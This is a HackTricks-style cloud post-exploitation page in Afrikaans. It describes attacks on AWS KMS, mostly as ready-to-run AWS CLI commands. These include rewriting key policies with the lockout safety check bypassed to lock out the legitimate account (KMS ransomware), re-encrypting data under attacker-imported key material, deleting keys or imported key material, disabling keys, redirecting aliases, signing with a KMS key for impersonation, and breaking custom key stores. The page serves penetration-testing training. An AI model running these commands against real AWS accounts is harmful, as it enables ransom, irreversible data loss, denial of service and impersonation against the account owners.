# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Vir meer inligting sien:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt information

`fileb://` and `file://` are URI-skema's wat in AWS CLI-opdragte gebruik word om die pad na plaaslike lêers te spesifiseer:

- `fileb://:` Lees die lêer in binêre modus, gewoonlik gebruik vir nie-tekslêers.
- `file://:` Lees die lêer in teksmodus, tipies gebruik vir gewone tekslêers, skripte, of JSON wat nie spesiale koderingvereistes het nie.

> [!TIP]
> Let daarop dat as jy data binne 'n lêer wil ontsleutel, die lêer die binêre data moet bevat, nie base64-geënkodeerde data nie. (fileb://)

- Gebruik 'n **symmetric** sleutel
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Deur 'n **asimmetriese** sleutel te gebruik:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

'n Aanvaller met bevoorregte toegang tot KMS kan die KMS policy van keys wysig en **sy account toegang daartoe verleen**, en sodoende die toegang wat aan die legit account toegestaan is, verwyder.

Dan sal die gebruikers van die legit account nie toegang hê tot enige inligting van enige diens wat met daardie keys geënkripteer is nie, wat 'n eenvoudige maar effektiewe ransomware oor die account skep.

> [!WARNING]
> Let wel dat **AWS managed keys** nie deur hierdie aanval geraak word nie, slegs **Customer managed keys**.
> 
> Neem ook kennis van die behoefte om die parameter **`--bypass-policy-lockout-safety-check`** te gebruik (die afwesigheid van hierdie opsie in die webkonsole maak hierdie aanval slegs moontlik vanaf die CLI).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Let daarop dat as jy daardie beleid verander en slegs toegang gee aan 'n eksterne rekening, en dan vanaf daardie eksterne rekening probeer om 'n nuwe beleid te stel om **die toegang terug aan die oorspronklike rekening te gee, sal jy dit nie kan doen nie omdat die Put Polocy action nie vanaf 'n kruis-rekening uitgevoer kan word nie**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generiese KMS Ransomware

Daar is nog 'n manier om 'n globale KMS Ransomware uit te voer, wat die volgende stappe behels:

- Skep 'n nuwe **sleutel met sleutelmateriaal** wat deur die aanvaller ingevoer is
- **Her-enkripteer ouer data** van die slagoffer wat met die vorige weergawe enkripteer is met die nuwe een.
- **Verwyder die KMS sleutel**
- Nou slegs die aanvaller, wat die oorspronklike sleutelmateriaal het, sal in staat wees om die enkripteerde data te ontsleutel

### Verwyder sleutels via kms:DeleteImportedKeyMaterial

Met die `kms:DeleteImportedKeyMaterial` toestemming kan 'n akteur die ingevoerde sleutelmateriaal van CMKs met `Origin=EXTERNAL` (CMKs wat hulle sleutelmateriaal ingevoer het) uitvee, wat hulle onmoontlik maak om data te ontsleutel. Hierdie aksie is destruktief en onomkeerbaar tensy versoenbare materiaal weer ingevoer word, wat 'n aanvaller effektief in staat stel om ransomware-agtige dataverlies te veroorsaak deur enkripteerde inligting permanent ontoeganklik te maak.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Vernietig keys

Deur keys te vernietig is dit moontlik om 'n DoS uit te voer.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Neem kennis dat AWS nou **voorkom dat die vorige aksies van 'n cross account uitgevoer word:** 

### Verander of verwyder Alias
Hierdie aanval verwyder of herlei AWS KMS aliases, wat sleuteloplossing breek en onmiddellike mislukkings veroorsaak in enige dienste wat op daardie aliases staatmaak, wat lei tot 'n denial-of-service. Met permissies soos `kms:DeleteAlias` of `kms:UpdateAlias` kan 'n aanvaller aliases verwyder of herlei en kriptografiese bedrywighede (bv., encrypt, describe) ontwrig. Enige diens wat na die alias verwys in plaas van na die key ID kan misluk totdat die alias herstel is of korrek herkaarteer is.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Cancel Key Deletion
Met toestemmings soos `kms:CancelKeyDeletion` en `kms:EnableKey`, kan 'n akteur 'n geskeduleerde verwydering van 'n AWS KMS customer master key kanselleer en dit later weer aktiveer. Deur dit te doen herstel die sleutel (aanvanklik in Disabled state) en herstel sy vermoë om voorheen beskermde data te ontsleutel, waardeur exfiltration moontlik word.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Disable Key
Met die `kms:DisableKey` toestemming kan 'n akteur 'n AWS KMS customer master key deaktiveer, waardeur dit nie vir versleuteling of ontsleuteling gebruik kan word nie. Dit verbreek toegang vir enige dienste wat op daardie CMK staatmaak en kan onmiddellike ontwrigtings of 'n denial-of-service veroorsaak totdat die sleutel weer geaktiveer word.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Aflei Gedeelde Geheim
Met die `kms:DeriveSharedSecret`-toestemming kan 'n akteur 'n KMS-gehoude private sleutel en 'n deur 'n gebruiker verskafde publieke sleutel gebruik om 'n ECDH-gedeelde geheim te bereken.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
Met die `kms:Sign` toestemming kan 'n actor 'n KMS-stored CMK gebruik om data kriptografies te teken sonder om die private key bloot te stel, wat geldige signatures produseer wat impersonation moontlik maak of kwaadwillige aksies magtig.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
Met toestemmings soos `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore`, of `kms:UpdateCustomKeyStore`, kan 'n aanvaller 'n AWS KMS Custom Key Store (CKS) wysig, ontkoppel of verwyder, wat sy hoofsleutels onbruikbaar maak. Dit breek enkripsie-, dekripsie- en ondertekeningsoperasies vir enige dienste wat op daardie sleutels staatmaak en kan 'n onmiddellike denial-of-service veroorsaak. Daarom is dit krities om daardie toestemmings te beperk en te monitor.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
